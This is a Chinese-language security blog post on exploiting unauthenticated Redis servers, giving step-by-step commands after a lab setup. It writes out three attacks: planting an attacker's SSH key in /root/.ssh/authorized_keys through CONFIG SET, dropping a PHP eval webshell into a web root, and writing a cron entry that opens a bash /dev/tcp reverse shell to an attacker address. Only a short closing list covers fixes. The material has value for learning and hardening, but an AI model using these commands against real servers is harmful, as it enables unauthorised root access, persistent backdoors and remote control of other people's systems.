<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 配置漏洞之redis未授权访问 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="配置漏洞之redis未授权访问 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">配置漏洞之redis未授权访问</h1><div class="post-time">Jul 12, 2017</div><div class="post-content"><h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><h3 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h3><p>解压缩后编译源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://download.redis.io/releases/redis-2.8.3.tar.gz</span><br><span class="line">$ tar xzf redis-2.8.3.tar.gz</span><br><span class="line">$ cd redis-2.8.3</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure></p>
<h3 id="编译完成后"><a href="#编译完成后" class="headerlink" title="编译完成后"></a>编译完成后</h3><p>在Src目录下，有四个可执行文件redis-server、redis-benchmark、redis-cli和redis.conf。然后拷贝到一个目录下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir /usr/redis</span><br><span class="line">cp redis-server  /usr/redis</span><br><span class="line">cp redis-benchmark /usr/redis</span><br><span class="line">cp redis-cli  /usr/redis</span><br><span class="line">cp redis.conf  /usr/redis</span><br><span class="line">cd /usr/redis</span><br></pre></td></tr></table></figure>
<h3 id="启动redis服务"><a href="#启动redis服务" class="headerlink" title="启动redis服务"></a>启动redis服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-server ./redis.conf</span><br></pre></td></tr></table></figure>
<h3 id="查看redis是否开启"><a href="#查看redis是否开启" class="headerlink" title="查看redis是否开启"></a>查看redis是否开启</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntlp | grep redis</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
<li>保存到www目录，创建webshell</li>
<li>创建SSH authorized_keys文件</li>
<li>写计划任务（/var/spool/cron/&amp;/etc/cron.d/）</li>
<li>slave of 8.8.8.8主从模式利用</li>
<li>写入到/etc/profile.d/用户环境变量</li>
<li>开启AOF持久化纯文本记录appendfilename</li>
</ul>
<h3 id="利用nmap获取redis信息"><a href="#利用nmap获取redis信息" class="headerlink" title="利用nmap获取redis信息"></a>利用nmap获取redis信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p6379 --script=redis-info 192.168.132.134</span><br></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/redis1.jpg" alt=""></p>
<h3 id="利用redis客户端进行未授权访问"><a href="#利用redis客户端进行未授权访问" class="headerlink" title="利用redis客户端进行未授权访问"></a>利用redis客户端进行未授权访问</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 192.168.132.134</span><br><span class="line">192.168.132.134:6379&gt; info</span><br></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/redis2.jpg" alt=""></p>
<p>当然，如果redis存在访问密码的话，可以使用如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 192.168.132.134 –a [password]</span><br></pre></td></tr></table></figure></p>
<h3 id="利用redis连接写入ssh公钥"><a href="#利用redis连接写入ssh公钥" class="headerlink" title="利用redis连接写入ssh公钥"></a>利用redis连接写入ssh公钥</h3><h4 id="在攻击机上生成ssh公钥和私钥"><a href="#在攻击机上生成ssh公钥和私钥" class="headerlink" title="在攻击机上生成ssh公钥和私钥"></a>在攻击机上生成ssh公钥和私钥</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/redis3.jpg" alt=""></p>
<h4 id="将公钥写入文本"><a href="#将公钥写入文本" class="headerlink" title="将公钥写入文本"></a>将公钥写入文本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;)&gt; 1.txt</span><br></pre></td></tr></table></figure>
<h4 id="将1-txt写入redis"><a href="#将1-txt写入redis" class="headerlink" title="将1.txt写入redis"></a>将1.txt写入redis</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 1.txt | /usr/local/redis/./redis-cli -h 192.168.132.134 -x set crack</span><br></pre></td></tr></table></figure>
<h4 id="利用redis客户端连接靶机redis"><a href="#利用redis客户端连接靶机redis" class="headerlink" title="利用redis客户端连接靶机redis"></a>利用redis客户端连接靶机redis</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 192.168.132.134</span><br></pre></td></tr></table></figure>
<h4 id="获取redis备份的路径"><a href="#获取redis备份的路径" class="headerlink" title="获取redis备份的路径"></a>获取redis备份的路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.132.134:6379&gt; CONFIG GET dir</span><br></pre></td></tr></table></figure>
<h4 id="更改redis备份路径"><a href="#更改redis备份路径" class="headerlink" title="更改redis备份路径"></a>更改redis备份路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.132.134:6379&gt; CONFIG SET dir /root/.ssh</span><br></pre></td></tr></table></figure>
<h4 id="设置备份文件的名称为authorized-keys"><a href="#设置备份文件的名称为authorized-keys" class="headerlink" title="设置备份文件的名称为authorized_keys"></a>设置备份文件的名称为authorized_keys</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.132.134:6379&gt; CONFIG SET dbfilename authorized_keys</span><br></pre></td></tr></table></figure>
<h4 id="检查是否更改"><a href="#检查是否更改" class="headerlink" title="检查是否更改"></a>检查是否更改</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.132.134:6379&gt; CONFIG GET dbfilename</span><br></pre></td></tr></table></figure>
<h4 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.132.134:6379&gt; save</span><br></pre></td></tr></table></figure>
<h4 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh –i  id_rsa root@192.168.1.11</span><br></pre></td></tr></table></figure>
<h3 id="利用redis写入Shell"><a href="#利用redis写入Shell" class="headerlink" title="利用redis写入Shell"></a>利用redis写入Shell</h3><h4 id="查看是否存在web服务"><a href="#查看是否存在web服务" class="headerlink" title="查看是否存在web服务"></a>查看是否存在web服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.111</span><br></pre></td></tr></table></figure>
<h4 id="确定web服务目录"><a href="#确定web服务目录" class="headerlink" title="确定web服务目录"></a>确定web服务目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /usr/local/apache/htdocs/</span><br><span class="line">config set dbfilename ok.php </span><br><span class="line">set test &quot;&lt;?php @eval($_POST[123]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<h4 id="菜刀连接一句话木马"><a href="#菜刀连接一句话木马" class="headerlink" title="菜刀连接一句话木马"></a>菜刀连接一句话木马</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/redis-cli0.png" alt=""></p>
<h3 id="写计划任务来反弹shell"><a href="#写计划任务来反弹shell" class="headerlink" title="写计划任务来反弹shell"></a>写计划任务来反弹shell</h3><h4 id="telnet登录-也可以redis-cli登录"><a href="#telnet登录-也可以redis-cli登录" class="headerlink" title="telnet登录/也可以redis-cli登录"></a>telnet登录/也可以redis-cli登录</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/redis-cli1.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.236.130 6379 //未授权登录</span><br><span class="line"></span><br><span class="line">config set dir /var/spool/cron/ //配置文件夹的路径（CONFIG SET 命令可以动态地调整 Redis 服务器的配置而(configuration)而无须重启。）//每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面</span><br><span class="line"></span><br><span class="line">set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.236.129/9999 0&gt;&amp;1\n\n\n&quot; //直接往当前用户的crontab里写入反弹shell，换行是必不可少的。</span><br></pre></td></tr></table></figure>
<h4 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/redis-cli2.png" alt=""></p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul>
<li>禁止使用 root 权限启动 redis 服务；</li>
<li>对 redis 访问启用密码认证，并且添加 IP 访问限制；</li>
<li>尽可能不对公网直接开放 SSH 服务。</li>
</ul>
</div></article></div></section><footer><div class="paginator"><a href="/posts/skill/Meatsploit-Framework-利用总结.html" class="prev">PREV</a><a href="/posts/skill/配置漏洞之DNS域传送信息泄露.html" class="next">NEXT</a></div><div class="copyright"><p>© 2016 - 2018 <a href="http://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>